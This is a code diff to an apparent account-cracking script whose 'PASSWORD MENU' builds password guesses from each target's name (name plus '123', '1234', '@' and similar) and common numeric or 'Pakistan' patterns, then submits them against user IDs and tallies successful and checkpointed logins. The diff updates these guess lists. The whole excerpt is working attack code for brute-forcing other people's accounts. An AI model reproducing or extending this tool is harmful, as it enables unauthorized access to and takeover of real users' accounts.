@@ -389,7 +389,7 @@ class __chigoue__:
     def kombinasi_pw(self,url):
         print('%s════════════════════════════════════════\n %sPASSWORD MENU%s'%(H,H,H))
         print('%s[%s1%s] Name,Name123,Name12345'%(H,H,H))
-        print('%s[%s2%s] Name,Name123,Name1234,Name12345'%(H,H,H))
+        print('%s[%s2%s] Name,Name123,Name1234,Name12345 Best'%(H,H,H))
         print('%s[%s3%s] Name,Name123,Name1234,Name12345,%s+Single Password Using Coma%s'%(H,H,H,H,H))
         pw = input(f"\n{H}[{H}+{H}] Select Password Method : ")
         if pw in[""]:
@@ -420,11 +420,11 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@"]
-                           pwx = ["000786", "786786", "Pakistan", "pakistan", "555786", "786555", "78678686", "11223344"]
+                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"113", xz[0]+"13", xz[0]+"228", xz[0]+"28"]
+                           pwx = ["000786", "786786", "Pakistan", "pakistan", "555786", "786113", "113786", "786228"]
                        else:
-                           pwx = ["000786", "786786", "Pakistan", "pakistan", "555786", "786555", "78678686", "11223344"]
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@"]
+                           pwx = ["000786", "786786", "Pakistan", "pakistan", "555786", "786113", "113786", "786228"]
+                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@", xz[0]+"113", xz[0]+"13", xz[0]+"228", xz[0]+"28"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
